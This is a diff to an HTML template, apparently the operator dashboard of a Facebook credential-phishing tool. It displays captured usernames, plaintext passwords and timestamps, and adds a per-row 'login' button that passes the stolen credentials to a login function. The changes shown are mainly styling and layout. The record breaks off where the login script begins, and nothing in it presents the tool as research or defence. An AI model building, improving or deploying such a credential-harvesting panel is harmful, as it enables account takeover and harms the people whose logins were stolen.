@@ -3,29 +3,50 @@
 	<head>
 		<title>Facebook Credentials Dashboard</title>
 		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+		<style>
+			#root {
+				width: 100%;
+				font-family: sans-serif;
+			}
+
+			table, th, td {
+				border: 1px solid black;
+				margin: 0 auto;
+			}
+
+			thead {
+				font-weight: bold;
+			}
+
+			td {
+				width: 20%;
+				padding: 5px;
+			}
+		</style>
 	</head>
-
 	<body>
-		<table>
-			<thead>
-				<tr>
-					<td>Username</td>
-					<td>Password</td>
-					<td>Timestamp</td>
-				</tr>
-			</thead>
-
-			<tbody>
-				{% for cred in credentials %}
+		<div id="root">
+			<table>
+				<thead>
 					<tr>
-						<td>{{ cred.username }}</td>
-						<td>{{ cred.password }}</td>
-						<td>{{ cred.logged_timestamp }}</td>
-						<td><button onClick="login('{{ cred.username }}', '{{ cred.password }}')">login</button></td>
+						<td>Username</td>
+						<td>Password</td>
+						<td>Timestamp</td>
 					</tr>
-				{% endfor %}
-			</tbody>
-		</table>
+				</thead>
+
+				<tbody>
+					{% for cred in credentials %}
+						<tr>
+							<td>{{ cred.username }}</td>
+							<td>{{ cred.password }}</td>
+							<td>{{ cred.logged_timestamp }}</td>
+							<td><button onClick="login('{{ cred.username }}', '{{ cred.password }}')">login</button></td>
+						</tr>
+					{% endfor %}
+				</tbody>
+			</table>
+		</div>
 	</body>
 	<script>
 		function login(user, pass) {
